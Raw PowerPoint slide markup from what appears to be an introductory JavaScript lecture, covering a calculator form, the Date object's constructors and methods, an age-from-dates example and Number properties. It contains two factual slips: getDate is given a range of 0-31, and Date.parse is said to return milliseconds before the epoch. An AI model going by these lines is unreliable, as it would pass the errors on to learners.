                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    }</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&lt;/script&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;h1&gt;JavaScript calculator&lt;/h1&gt;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&lt;form action="" method="get" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name="calculator"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;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Input: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input type="text" name="expr" size="60"&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;br&gt;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Ouput: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input type="text" name="result" readonly size="60"&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;br&gt;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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input type="button" value="Calculate" onclick="calc(document.calculator)"&gt;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&lt;/form&gt;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  &lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1200">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{617F2F9C-C46A-4BC7-8B4F-799225D84E34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Date</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{51F2C886-5F92-4B6C-A55B-7C934074A6DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1881188" y="1600200"/>
            <a:ext cx="8286750" cy="5043488"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Constructors:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	new Date() // current date &amp; time</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	new Date(ms) // since EPOCH (1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" baseline="30000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>st</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> of Jan 1970)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new Date(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>dateString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) // "May 1, 2009 13:59:00"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new Date(year, month, day, h, min, sec, ms)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	// you can omit any of above and 0 is assumed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Methods:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getFullYear</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() = returns 4-digit year component of date</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getMonth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() = returns month (0-11, 0 = January ! )</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() = returns day of month (0-31)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getHours</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() = returns hour component of date (0-23)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getMinutes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() = returns minute component of date (0-59)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getSeconds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() = returns second component of date (0-59)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>setFullYear</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>year</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month</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day</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) = set the year, month and day</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>setMonth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>month</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day</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) = set month and day</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>setSecond</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>second</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millisecond</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) = set second and millisecond</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>toString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() = converts date to string format</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Date.parse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>dateString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) = parses the date string and returns how many ms before EPOCH</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{08FEECAC-5B2D-432A-AFDE-E801ADD12E60}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Calculating with Dates</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C18213A2-AD24-49CF-B58F-D2560F493C6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Dates can be subtracted from each other and the result of the calculation is given as milliseconds (ms)</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current time &amp; date</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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	var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>now = new Date();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1st of Jan 1980, 00:00:00 time</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>birth = new Date(1980, 0, 1);</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difference in ms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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	var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>diff = now-birth;</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calculate difference in days</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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	var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>days = diff/1000/60/60/24;</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divide by days per year</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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	var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>years = days/365.25;</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18AC9211-AB6D-4813-A40E-AD69414ECE41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Number</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3A6665F-1A49-45E8-9BA0-A044DEF5B8AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8401050" cy="4900613"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Properties:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>MAX_VALUE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = largest </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>representable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>MIN_VALUE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = smallest </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>representable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>NaN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = not a number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Methods:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>toFixed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) = format number to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x </a:t>
